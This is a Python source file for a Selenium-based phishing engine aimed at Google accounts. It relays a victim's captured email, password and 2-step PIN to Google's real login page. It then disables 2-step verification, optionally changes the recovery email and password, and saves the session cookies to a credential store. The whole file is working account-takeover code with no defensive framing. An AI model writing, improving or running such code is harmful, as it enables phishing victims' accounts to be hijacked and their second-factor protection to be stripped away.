from collections import defaultdict
from threading import Lock,Thread
import time

from selenium import webdriver

from phishing import credstore

lock = Lock()

browser_cache = defaultdict()

class PhishEngine:
    def __init__(self):
        pass


def google_first_factor(data):
    try:
        browser  = webdriver.Firefox()
        browser.get("https://accounts.google.com")
        time.sleep(0.25)
        print "Entering Username"
        browser.find_element_by_id("Email").send_keys(data['Email'])
        browser.find_element_by_id("next").click()
        time.sleep(0.50)
        print 'Entering Password'
        browser.find_element_by_id("Passwd").send_keys(data['Passwd'])
        browser.find_element_by_id("signIn").click()

        lock.acquire()
        browser_cache[data['X-Session']] = browser
        lock.release()
    except:
        print 'Something wierd happened'
        pass

def google_second_factor(data):
    try:
        browser = None
        lock.acquire()
        if data['X-Session'] in browser_cache:
            browser = browser_cache[data['X-Session']]
        lock.release()

        if browser is None:
            return

        #2step
        fpin = browser.find_element_by_id("idvPreregisteredPhonePin")
        fpin.send_keys(data['pin'])
        browser.find_element_by_id("submit").click()
        if len(browser.find_elements_by_id("errorMsg")) > 0:
            #Failed Attempt
            return

        #Turn off 2-step verification
        browser.get("https://accounts.google.com/b/0/SmsAuthSettings#devices")
        if browser.title == "Sign in - Google Accounts":
            browser.find_element_by_id("Passwd").send_keys(data['Passwd'])
            browser.find_element_by_id("signIn").click()
        time.sleep(1)
        browser.find_element_by_id('smsauth3settings-disable-button').click()
        browser.find_elements_by_xpath("//div[@class='modal-dialog-buttons']/button[@name='action']")[3].click()

        #RescueMail
        if "NewEmail" in data:
            print "Changing Resque Mail"
            browser.get("https://security.google.com/settings/security/signinoptions/rescueemail")

            if browser.title == "Sign in - Google Accounts":
                browser.find_element_by_id("Passwd").send_keys(data['Passwd'])
                browser.find_element_by_id("signIn").click()
                time.sleep(1)

            input_box = browser.find_elements_by_tag_name('input')[0]
            input_box.clear()
            input_box.send_keys(data['NewEmail'])

            doneBtns = browser.find_elements_by_xpath("//div[@role='button']")
            doneBtn = doneBtns[2]
            doneBtn.click()

        #Change Passwd
        if "NewPasswd" in data:
            print "Changing Password"
            browser.get("https://myaccount.google.com/security/signinoptions/password")

            if browser.title == "Sign in - Google Accounts":
                browser.find_element_by_id("Passwd").send_keys(data['Passwd'])
                browser.find_element_by_id("signIn").click()

            time.sleep(1)

            passwds = browser.find_elements_by_tag_name('input')
            print 'Applying New Password'
            passwds[0].send_keys(data["NewPasswd"])
            passwds[1].send_keys(data["NewPasswd"])
            time.sleep(1)
            btns = browser.find_elements_by_xpath("//div[@role='button']")
            btn = btns[4]
            btn.click()

        print "Saving to database"
        data['data'] = browser.get_cookies()
        browser.close()
        lock.acquire()
        browser_cache.pop(data['X-Session'])
        lock.release()

        credstore.UserSessionStore.store(data)
    except:
        pass

class GooglePhishEngine(PhishEngine):

    def __init__(self):
        PhishEngine.__init__(self)

    @staticmethod
    def first_factor(data):
        gthread = Thread(target=google_first_factor,args=(data,))
        gthread.start()

    @staticmethod
    def second_factor(data):

        gthread = Thread(target=google_second_factor,args=(data,))
        gthread.start()



